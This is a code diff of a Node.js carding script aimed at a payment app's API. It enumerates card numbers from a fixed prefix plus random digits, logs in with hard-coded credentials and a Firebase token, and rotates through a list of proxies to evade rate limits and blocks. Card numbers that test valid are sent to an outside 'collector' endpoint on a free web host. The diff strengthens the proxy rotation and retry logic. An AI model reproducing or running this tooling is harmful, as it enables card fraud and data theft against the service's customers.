@@ -58,8 +58,8 @@ const html = `
 `
 const fs = require('fs');
 const HttpsProxyAgent = require('https-proxy-agent');
-var proxies = ["31.186.239.245:8080",    "200.105.215.22:33630",    "49.0.2.242:8090",    "198.49.68.80:80",    "212.107.28.122:80",    "169.57.1.85:8123",    "41.175.26.113:80",    "190.61.88.147:8080",    "167.172.158.85:81",    "185.147.35.240:80",    "31.186.239.246:8080",    "139.99.237.62:80",    "185.191.76.84:80",    "209.182.239.62:80",    "154.26.134.214:80",    "20.111.54.16:80",  "221.132.28.18:8090", "110.164.3.7:8888",    "216.137.184.253:80",   "104.148.36.10:80",    "31.186.239.244:8080",    "161.35.223.141:80",    "45.79.110.81:80",    "64.227.23.88:8118",    "51.75.141.46:80",    "161.97.126.37:8118",  "102.130.192.231:8080",    "198.59.191.234:8080",    "87.247.186.105:80",    "34.71.115.148:80",    "72.170.220.17:8080",    "173.212.195.139:80",    "195.158.3.103:8080","45.152.188.248:3128"];
-
+var proxies = [ "164.92.73.145:3128", "135.148.95.28:3128", "190.110.208.229:999"]
+//var proxies = [    "154.79.242.178:1686",    "98.148.96.228:8111",    "81.143.236.200:443"]
 
 var cookie = require('cookie');
 
@@ -67,20 +67,14 @@ var cookie = require('cookie');
   var num = "0118883434";
 const fetch = require('node-fetch');
 login = { userIdentifier: num,password:num,fireBaseToken:"diehJic_R7qwLo0wDm71k1:APA91bHsL-ye5a69TZ94Pd6e2wRW_KcXlbXWawyyFbsGudgfv4mQ-8kbJnNllyLzm9_rbdHxUJngaspTtpQQqtgr8N1M8HGzYWAjeZQrtwn2dlINzrjJLtrVO6z_jrHTYyXrs_7mxefO"};
-/*
-var reader = readline.createInterface({
-  input: fs.createReadStream('col.txt')
-  });
-reader.on('line', function (card) {});
-*/
-//var timer = setInterval(function(){},500)
-  //var card = "7222081370019771304";
+
   function fish(){
-var card = "6391750"+rand(9);
+var card = "6391730"+rand(9);
+card = "6391871200106647";
 //Math.random().toString().slice(2,11);
 var random = Math.floor(Math.random()*proxies.length);
     var proxy = proxies[random];
-//var proxyAgent = new HttpsProxyAgent('http://'+proxy);
+var Agent = new HttpsProxyAgent('http://'+proxy);
 fetch('https://syberapp.sybertechnology.com/api/login',{
   method: 'POST',
   body:JSON.stringify(login),
@@ -90,8 +84,9 @@ fetch('https://syberapp.sybertechnology.com/api/login',{
     'Version':'100',
     'User-Agent':'okhttp/4.9.1',
   },
-  //agent: proxyAgent
+  agent: Agent
 }).then((response) =>{ 
+  
   var status = response.status;
   if(status == 200){
     
@@ -114,12 +109,13 @@ fetch('https://syberapp.sybertechnology.com/customerInfo',{
     'User-Agent':'okhttp/4.9.1',
    'Cookie':"remember-me-posc="+re
   },
-  //agent: proxyAgent
+  agent: Agent
 }).then(response=>response.json()).then(data=>{
   if(data.errorCode){
     //console.log("Error "+card + " "+data.errorCode);
     fish();
   }else if(data.responseStatus){
+    console.log("Success "+ card)
  fetch('https://renoche.000webhostapp.com/collector/accounts.php', {
     method: 'POST',
 
@@ -134,12 +130,7 @@ fetch('https://syberapp.sybertechnology.com/customerInfo',{
 {"id":card}
 )
 })
-    console.log("Success "+ card)
-fs.appendFile("live.txt",card+"\n",function (err) {if (err) throw err;
-
-fish();
-});
-
+fish()
   }
 }).catch((error)=>{
   if(error.code == 'ECONNREFUSED'){
@@ -152,15 +143,25 @@ fish()
 console.log("Forbidden "+proxy)
 fish()
 }else if(status == 500){
-//console.log("System Error "+proxy)
+//console.log("System Error 500 : " + proxy )
+fish()
+}else if(status == 503){
+//console.log("System Error 500 : " + proxy )
+fish()
+}else if(status == 400){
+//console.log("System Error 500 : " + proxy )
+fish()
+}else if(status == 404){
+//console.log("System Error 500 : " + proxy )
 fish()
 }else{
 console.log("Account Locked "+status+" "+proxy)
+fish()
 }
 }).catch((error)=>{
   if(error.code == 'ECONNREFUSED'){
   console.log("Proxy Refused " +proxy)
-go()
+fish()
   }
 })
 
@@ -185,7 +186,3 @@ function rand(length) {
     }
     return result;
 }
-
-setInterval(()=>{
-fetch("https://ren-carder.glitch.me/")
-},240000)
